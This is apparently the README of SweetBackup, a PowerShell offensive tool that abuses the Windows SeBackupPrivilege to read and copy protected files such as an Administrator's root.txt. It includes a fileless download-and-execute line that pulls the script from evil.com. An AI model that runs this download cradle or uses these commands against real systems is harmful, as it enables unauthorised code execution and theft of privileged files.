# SweetBackup

SweetBackup is a PowerShell version of [SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege), some commands are identically named. It was written with PSReflect for PInvoke to avoid any artifacts and its PowerShell v2 compliant.

Usage
=====================

Import the script
-----------------

* <code>PS> Import-Module .\SweetBackup.ps1</code>

* <code>PS> . .\SweetBackup.ps1</code>

* <code>PS> IEX (New-Object System.Net.WebClient).DownloadString('https://evil.com/SweetBackup.ps1')</code>

Available commands
-----------------

* Retreive status of SeBackupPrivilege access token: <code>Get-SeBackupPrivilege</code>
 
* Enable SeBackupPrivilege: <code>Set-SeBackupPrivilege</code>

* Read content of a file: <code>Read-FileContent -Backup -Path C:\Users\Administrator\Desktop\root.txt ;)</code>

* Set content of a file: <code>Set-FileContent -Path .\hello.txt -Content "hello"</code>

* Add content to a file: <code>Add-FileContent -Path .\hello.txt -Content "$([System.Environment]::NewLine)hello"</code>

* Copy a file: <code>Copy-File -Path C:\Users\Administrator\Desktop\root.txt -Destination .\root.txt -Backup</code>

The -Backup flag indicates if SeBackupPrivilege need to be used.

Future changes
=====================

I don't really have idea about how to improve this small project, but if you have, feel free raise an issue or propose a pull requests !
